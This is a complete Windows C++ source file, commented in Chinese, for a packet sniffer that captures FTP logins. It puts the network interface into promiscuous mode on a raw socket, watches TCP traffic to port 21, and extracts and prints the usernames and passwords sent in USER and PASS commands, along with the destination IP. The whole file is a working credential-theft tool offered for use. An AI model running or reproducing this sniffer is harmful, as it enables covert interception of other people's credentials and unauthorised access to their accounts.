// GetFtpPass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
#include <string.h>
#define   SIO_RCVALL                         _WSAIOW(IOC_VENDOR,1)   


typedef struct _IPHeader
{
    UCHAR     iphVerLen;      // 版本号和首部长度（各占4位）
    UCHAR     ipTOS;          // 8位服务类型 
    USHORT    ipLength;       // IP数据报总长度
    USHORT    ipID;			  // 16位标识
    USHORT    ipFlags;	      // 3位标志和13位片偏移
    UCHAR     ipTTL;	      // 8位生存时间
    UCHAR     ipProtocol;     // 8位协议，可能是TCP、UDP、ICMP等
    USHORT    ipChecksum;     // 16位首部校验和
    ULONG     ipSource;       // 32位源IP地址
    ULONG     ipDestination;  // 32位目标IP地址
} IPHeader, *PIPHeader; 




typedef struct _TCPHeader		
{
	USHORT	sourcePort;			// 16位源端口号
	USHORT	destinationPort;	// 16位目的端口号
	ULONG	sequenceNumber;		// 32位序列号
	ULONG	acknowledgeNumber;	// 32位确认号
	UCHAR	dataoffset;			// 高4位表示数据偏移
	UCHAR	flags;				// 6位标志比特
	USHORT	windows;			// 16位窗口大小
	USHORT	checksum;			// 16位校验和
	USHORT	urgentPointer;		// 16位紧急指针
} TCPHeader, *PTCPHeader;

void GetPassWord(char *buff)
{
	//保存用户名
	char UserName[256];
	//保存密码
	char PassWord[256];
	//定位到IP首部
	IPHeader *Iphdr =(IPHeader*)buff;
	//定位到TCP首部
	TCPHeader *Tcphdr=(TCPHeader*)&buff[sizeof(IPHeader)];
	//比较协议是否是TCP协议，目的端口号是否是FTP端口号
	if(Iphdr->ipProtocol!=IPPROTO_TCP||ntohs(Tcphdr->destinationPort)!=21)	
		return;
	//定位到FTP报文
	char *FtpData=(char*)&buff[sizeof(IPHeader)+sizeof(TCPHeader)];
	//比较“USER”特征字符
	if(strnicmp(FtpData,"USER ",5)==0)
	{
		//得到用户名
		sscanf(FtpData+4,"%*[ ]%s",UserName);
	}
    //比较“PASS”特征字符
	if(strnicmp(FtpData,"PASS ",5)==0)
	{
	   //得到密码
       sscanf(FtpData+4,"%*[ ]%s",PassWord);
	   //输出目的IP
       printf("目的IP：%s\n",inet_ntoa(*(in_addr*)&Iphdr->ipDestination));
	   //输出用户名
       printf("用户名：%s\n",UserName);
	   //输出密码
       printf("密码：%s\n",PassWord);
	}
}


int main(int argc, char* argv[])
{
	WSADATA wsaData;
    WORD sockVersion = MAKEWORD(2, 2);
	//加载winsock库
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	// 创建原始套节字
	SOCKET sRaw = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
	char szHostName[56];
	SOCKADDR_IN addr_in;
	struct  hostent *pHost;
	//得到本机计算机名
	gethostname(szHostName, 56);
	//通过计算机名得到IP
	if((pHost = gethostbyname((char*)szHostName)) == NULL)	
		return 0;
	in_addr addr;
	sockaddr_in addr_s;
	//循环输出IP地址
	for(int i=0;;i++)
	{
		char *p=pHost->h_addr_list[i];
		if(p==NULL)
			break;
		memcpy(&addr.S_un.S_addr,p,pHost->h_length);
		printf("第%d个ip：%s\n",i+1,inet_ntoa(addr));	
	}
	printf("请输入要绑定在哪个ip上：");
	int num;
	//选择要监听的IP地址
	scanf("%d",&num);
	if(num<1||num>i)
	{
		printf("输入错误\n");
		return 0;
	}
	//填写sockaddr_in结构
	addr_s.sin_family= AF_INET;
	addr_s.sin_port=htons(0);
	memcpy(&addr_s.sin_addr.S_un.S_addr, pHost->h_addr_list[num-1], pHost->h_length);
	//绑定套接字到指定IP
	if(bind(sRaw, (PSOCKADDR)&addr_s, sizeof(addr_s)) == SOCKET_ERROR)
	{
		printf("bind error\n");
		return 0;
	}
	DWORD dwValue = 1;
	//设置网卡位混杂模式
	if(ioctlsocket(sRaw,SIO_RCVALL, &dwValue) != 0)
	{
		printf("ioctlsocket error\n");
		return 0;
	}
	printf("正在嗅探ftp密码........\n");
	char buff[1024];
	int nRet;
	//循环接收数据
	while(TRUE)
	{
		nRet = recv(sRaw, buff, 1024, 0);
		if(nRet > 0)
		{
			GetPassWord(buff);	
		}
	}
	closesocket(sRaw);
	return 0;
}
